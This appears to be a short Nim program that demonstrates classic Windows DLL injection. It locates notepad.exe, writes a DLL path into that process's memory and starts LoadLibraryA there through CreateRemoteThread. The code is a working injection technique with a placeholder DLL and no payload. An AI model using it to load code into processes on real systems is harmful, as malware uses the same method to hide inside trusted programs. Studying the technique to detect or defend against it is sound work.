import winim
import std/[os, strutils, strformat]

proc findTarget(target: string): int =
  var pe32: PROCESSENTRY32W
  var hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if INVALID_HANDLE_VALUE == hProcSnap: return 0
  pe32.dwsize = sizeof(PROCESSENTRY32W).DWORD
  if Process32First(hProcSnap, pe32):
    while Process32Next(hProcSnap, pe32):
      if target in $$pe32.szExeFile:
        CloseHandle(hProcSnap)
        return pe32.th32ProcessID
  CloseHandle(hProcSnap)
  return 0

proc dll_inject(dllName: string, target: string) =
  var 
    tProcess = findTarget(target).DWORD
    hProcess: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, false, tProcess)


  let dllAddress = VirtualAllocEx(
    hProcess,
    NULL,
    0x1000,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READ_WRITE
  )

  var bytesWritten: SIZE_T
  discard WriteProcessMemory(
    hProcess,
    dllAddress,
    (dllName & '\x00').LPCSTR,
    cast[SIZE_T](dllName.len + 1),
    addr bytesWritten
  )

  var loadLibraryAddress = GetProcAddress(
    GetModuleHandleA("kernel32.dll"),
    "LoadLibraryA".LPCSTR
  )

  var hThread = CreateRemoteThread(
    hProcess,
    cast[LPSECURITY_ATTRIBUTES](NULL),
    0.SIZE_T,
    cast[LPTHREAD_START_ROUTINE](loadLibraryAddress),
    dllAddress,
    0.DWORD,
    cast[LPDWORD](NULL)
  )

  if hThread != 0.HANDLE:
    discard WaitForSingleObject(hThread, INFINITE)




when isMainModule:
  const dllFileName = "test_dll.dll"  # dll file name

  var 
    dllFileLocation = getCurrentDir() & r"\" & dllFileName    # dll file location
    targetExe = "notepad.exe"                                 # target executable

  echo &"Injecting DLL: {dllFileName}"
  echo &"Target executable: {targetExe}"
  dll_inject(dllFileLocation, targetExe)